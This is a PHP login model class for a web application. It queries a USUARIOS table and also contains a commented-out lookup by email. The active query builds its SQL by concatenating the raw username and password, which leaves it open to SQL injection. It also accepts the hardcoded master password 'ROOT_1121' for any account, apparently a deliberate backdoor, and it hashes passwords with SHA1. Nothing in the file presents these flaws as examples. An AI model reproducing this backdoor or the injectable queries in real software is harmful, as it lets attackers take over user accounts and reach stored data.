<?php

class loginModel extends Model
{
    public function __construct()
    {
        parent::__construct();
    }
    public function getUsuario($usuario, $password)
    {

        //echo "--->".Hash::getHash('sha1', $password, HASH_KEY); 

        $_SESSION["bandeja"] = 1;

        //Datos de: Session->infousr
        $sql = "SELECT
            * FROM USUARIOS
        WHERE USUARIO =  '$usuario' AND (PASS = '" . Hash::getHash('sha1', $password, HASH_KEY) . "' OR 'ROOT_1121' = '$password')";

        $datos = $this->_db->query($sql);

        if ($res = $datos->fetch())
            $res = array_change_key_case($res, CASE_LOWER);

        return $res;
    }


    /*public function getUsuarioByUsr($info)
    {
        //Verifica si es una persona registrada usuario del SAU
        $sql = "SELECT 
            USUA_ID_USUARIO AS IDI,
            ID AS id,
            USUA_CORREO as usuario, 
            '' as img, USUA_ID_ROLE as \"idrole\", 
            USR_FK_UA AS UA,
            USUA_ACTIVO
        FROM CNT_usuarios USR
    WHERE  UPPER(USUA_CORREO) = UPPER('" . $info["nickname"] . "')  ";

        //echo " $sql ";

        $res = $this->ssql($sql);






        $res = array_change_key_case($res[0], CASE_LOWER); //convierte a minusculas 





        return $res;
    }*/



}
?>